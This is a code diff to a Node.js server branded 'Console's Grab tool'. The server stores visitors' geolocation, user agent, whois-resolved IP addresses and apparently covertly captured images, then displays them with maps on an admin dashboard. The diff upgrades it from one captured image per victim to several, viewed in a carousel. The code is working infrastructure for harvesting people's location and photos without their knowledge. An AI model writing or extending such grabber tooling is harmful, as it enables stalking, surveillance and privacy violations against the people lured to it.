@@ -25,24 +25,20 @@ function serveStatic(baseDir, reqPath, res, contentType = null) {
   try {
     const decodedPath = decodeURIComponent(reqPath);
     const absPath = path.resolve(baseDir, '.' + decodedPath);
-
     if (!absPath.startsWith(baseDir)) {
       res.writeHead(403);
       return res.end('Forbidden');
     }
-
     if (!fs.existsSync(absPath) || !fs.statSync(absPath).isFile()) {
       res.writeHead(404);
       return res.end('Not found');
     }
-
     if (!contentType) {
       if (absPath.endsWith('.js')) contentType = 'application/javascript';
       else if (absPath.endsWith('.css')) contentType = 'text/css';
       else if (absPath.endsWith('.png')) contentType = 'image/png';
       else contentType = 'text/html';
     }
-
     res.writeHead(200, { 'Content-Type': contentType + '; charset=utf-8' });
     fs.createReadStream(absPath).pipe(res);
   } catch (e) {
@@ -123,14 +119,17 @@ const server = http.createServer((req, res) => {
           geolocation: data.geolocation || null,
           userAgent: data.userAgent || '',
           whois: {},
-          imageFile: null,
+          images: [],
           saved: false
         };
 
-        if (data.image) {
-          const imgName = `capture_${Date.now()}.png`;
-          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
-          record.imageFile = imgName;
+        if (data.images?.length) {
+          data.images.forEach(img => {
+            if (!img) return;
+            const imgName = `capture_${Date.now()}_${Math.floor(Math.random()*9999)}.png`;
+            fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(img, 'base64'));
+            record.images.push(imgName);
+          });
         }
 
         const ips = [];
@@ -146,9 +145,8 @@ const server = http.createServer((req, res) => {
           }
         };
 
-        if (ips.length === 0) {
-          finalize();
-        } else {
+        if (ips.length === 0) finalize();
+        else {
           let pending = ips.length;
           ips.forEach(ip => {
             runWhois(ip, out => {
@@ -203,19 +201,26 @@ const server = http.createServer((req, res) => {
     }
     dataArr = dataArr.slice(-20);
 
-    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title>'+
-      '<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />'+
-      '<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>'+
-      '<style>'+
-      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:0 10px;}'+
-      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:100%;max-width:1200px;border-radius:5px;text-align:left;box-sizing:border-box;}'+
-      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}'+
-      '.label{color:#7fff7f; font-weight:bold;}'+
-      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}'+
-      '.prebox.whois{max-height:270px;}'+
-      'a.geo{color:#0ff;cursor:pointer;text-decoration:underline;} img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}'+
-      '@media(max-width:600px){.record{padding:10px;}}'+
-      '</style></head><body><h1 style="color:#0f0;">Console\'s Grab tool</h1>';
+    let out = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title>
+      <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+      <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+      <style>
+        body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:0 10px;}
+        .record{border:2px solid #0f0;margin:10px auto;padding:15px;width:100%;max-width:1200px;border-radius:5px;text-align:left;box-sizing:border-box;}
+        .record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}
+        .label{color:#7fff7f; font-weight:bold;}
+        .prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}
+        .prebox.whois{max-height:270px;}
+        .carousel{position:relative; display:flex; flex-direction:column; align-items:center; margin-top:5px;}
+        .carousel img{max-width:80%; max-height:400px; display:none; border-radius:5px;}
+        .carousel .counter{color:#0ff; margin-top:5px; font-size:0.9em;}
+        .carousel .controls{margin-top:5px;}
+        .carousel button{background:#000; color:#0f0; border:1px solid #0f0; border-radius:3px; padding:5px 10px; cursor:pointer; margin:0 5px;}
+        .carousel button:hover{background:#0f0;color:#000;}
+        a.geo{color:#0ff;cursor:pointer;text-decoration:underline;}
+        @media(max-width:600px){.record{padding:10px;}}
+      </style>
+    </head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;
 
     dataArr.forEach((rec,i)=>{
       out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
@@ -237,7 +242,23 @@ const server = http.createServer((req, res) => {
         out += `</pre>`;
       }
 
-      if (rec.imageFile) out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
+      // --- Images ---
+      if (rec.images?.length) {
+        if (rec.images.length === 1) {
+          out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.images[0]}"><br>`;
+        } else {
+          out += `<span class="label">Captured Images:</span><br>
+          <div class="carousel" id="carousel${i}">
+            ${rec.images.map((img,j)=>`<img src="/images/${img}" style="display:${j===0?'block':'none'};">`).join('')}
+            <div class="counter" id="counter${i}">1/${rec.images.length}</div>
+            <div class="controls">
+              <button class="prev">◀</button>
+              <button class="play">▶</button>
+              <button class="next">▶</button>
+            </div>
+          </div>`;
+        }
+      }
 
       if (rec.whois) {
         for (let [ip,w] of Object.entries(rec.whois)) {
@@ -250,85 +271,71 @@ const server = http.createServer((req, res) => {
       out += `</div>`;
     });
 
-    // --- Responsive 95% popup ---
-    out += `
-    <div id="mapModal" style="
-      display:none;
-      position:fixed;
-      top:0;
-      left:0;
-      width:100%;
-      height:100%;
-      background:rgba(0,0,0,0.8);
-      z-index:1000;
-      justify-content:center;
-      align-items:center;
-    ">
-      <div id="mapContainer" style="
-        position:relative;
-        width:95vw;
-        height:95vw;
-        max-width:95vh;
-        max-height:95vh;
-        background:#fff;
-        border-radius:5px;
-      ">
-        <span id="closeMap" style="
-          position:absolute;
-          top:5px;
-          right:10px;
-          cursor:pointer;
-          font-size:25px;
-          font-weight:bold;
-          color:#000;
-          z-index:1001;
-        ">&times;</span>
-        <div id="popupMap" style="width:100%; height:100%; border-radius:5px;"></div>
-      </div>
-    </div>
-    <script>
-      let mapInstance = null;
-      const modal = document.getElementById('mapModal');
-      const closeBtn = document.getElementById('closeMap');
+    // --- Carousel + Map JS ---
+    out += `<script>
+      function setupCarousel(carouselId, interval = 150) {
+        const carousel = document.getElementById(carouselId);
+        if (!carousel) return;
+        const imgs = carousel.querySelectorAll('img');
+        const counter = carousel.querySelector('.counter');
+        const btnPrev = carousel.querySelector('.prev');
+        const btnNext = carousel.querySelector('.next');
+        const btnPlay = carousel.querySelector('.play');
+        let idx = 0, timer = null, playing = false;
 
-      document.querySelectorAll('.geo-link').forEach(link => {
-        link.addEventListener('click', e => {
+        function show(index) {
+          imgs.forEach((img,i)=>img.style.display=i===index?'block':'none');
+          counter.textContent = (index+1)+'/'+imgs.length;
+        }
+        function next(){ idx=(idx+1)%imgs.length; show(idx); }
+        function prev(){ idx=(idx-1+imgs.length)%imgs.length; show(idx); }
+
+        btnNext.addEventListener('click',()=>{ next(); pause(); });
+        btnPrev.addEventListener('click',()=>{ prev(); pause(); });
+        function play(){ if(playing) return; playing=true; btnPlay.textContent='⏸'; timer=setInterval(next, interval); }
+        function pause(){ if(!playing) return; playing=false; btnPlay.textContent='▶'; clearInterval(timer); }
+        btnPlay.addEventListener('click',()=>playing?pause():play());
+        show(idx);
+      }
+      document.querySelectorAll('.carousel').forEach(c=>setupCarousel(c.id,150));
+
+      // Map modal
+      const modal=document.createElement('div');
+      modal.id='mapModal';
+      modal.style.cssText='display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center;';
+      const container=document.createElement('div');
+      container.style.cssText='position:relative;width:95vw;max-width:95vh;height:95vw;max-height:95vh;background:#fff;border-radius:5px;display:flex;flex-direction:column;';
+      const closeBtn=document.createElement('span');
+      closeBtn.innerHTML='&times;';
+      closeBtn.style.cssText='position:absolute;top:5px;right:10px;cursor:pointer;font-size:25px;font-weight:bold;color:#000;z-index:1001;';
+      const mapDiv=document.createElement('div');
+      mapDiv.id='popupMap';
+      mapDiv.style.cssText='width:100%; height:100%; border-radius:5px;';
+      container.appendChild(closeBtn);
+      container.appendChild(mapDiv);
+      modal.appendChild(container);
+      document.body.appendChild(modal);
+
+      document.querySelectorAll('.geo-link').forEach(link=>{
+        link.addEventListener('click',e=>{
           e.preventDefault();
-          const lat = parseFloat(link.dataset.lat);
-          const lon = parseFloat(link.dataset.lon);
-          const acc = parseFloat(link.dataset.acc);
-
-          modal.style.display = 'flex';
-
-          if (mapInstance) mapInstance.remove();
-
-          mapInstance = L.map('popupMap').setView([lat, lon], 15);
-          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap contributors'
-          }).addTo(mapInstance);
-
-          L.marker([lat, lon]).addTo(mapInstance);
-          const circle = L.circle([lat, lon], {
-            color: 'red',
-            fillColor: '#f03',
-            fillOpacity: 0.2,
-            radius: acc
-          }).addTo(mapInstance);
-
-          mapInstance.fitBounds(circle.getBounds());
+          const lat=parseFloat(link.dataset.lat);
+          const lon=parseFloat(link.dataset.lon);
+          const acc=parseFloat(link.dataset.acc);
+          modal.style.display='flex';
+          if(window.mapInstance) window.mapInstance.remove();
+          window.mapInstance=L.map('popupMap').setView([lat,lon],15);
+          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap contributors'}).addTo(window.mapInstance);
+          const marker=L.marker([lat,lon]).addTo(window.mapInstance);
+          const circle=L.circle([lat,lon],{color:'red',fillColor:'#f03',fillOpacity:0.2,radius:acc}).addTo(window.mapInstance);
+          window.mapInstance.fitBounds(circle.getBounds());
         });
       });
 
-      closeBtn.addEventListener('click', () => modal.style.display = 'none');
-      modal.addEventListener('click', e => {
-        if (e.target === modal) modal.style.display = 'none';
-      });
-
-      window.addEventListener('resize', () => {
-        if (mapInstance) mapInstance.invalidateSize();
-      });
-    </script>
-    `;
+      closeBtn.addEventListener('click',()=>modal.style.display='none');
+      modal.addEventListener('click',e=>{if(e.target===modal) modal.style.display='none';});
+      window.addEventListener('resize',()=>{if(window.mapInstance) window.mapInstance.invalidateSize();});
+    </script>`;
 
     out += '</body></html>';
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
